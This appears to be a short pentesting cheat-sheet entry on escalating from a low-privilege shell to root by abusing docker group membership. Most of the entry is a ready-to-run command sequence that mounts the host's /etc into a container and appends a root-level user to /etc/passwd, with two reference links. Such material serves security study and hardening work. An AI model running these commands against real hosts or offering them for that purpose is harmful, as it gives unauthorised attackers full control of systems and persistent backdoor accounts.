# Groups that lead to ROOT

> If the low priv shell is member of one the following groups we can upgrade to root.

## docker

We can mount the full file system of the host to gain access to the full system then `chroot` to gain full privileges on the host:

```bash
docker run -v /etc/:/mnt -it alpine
cd /mnt
echo 'user:saltpasswd:0:0::/root:/bin/bash' >>passwd
tail passwd
su user
#type password and get root
```
More info:

* [Hackingarticles](https://www.hackingarticles.in/docker-privilege-escalation/)

* [Medium-Affix](https://medium.com/@Affix/privilege-escallation-with-docker-56dc682a6e17)
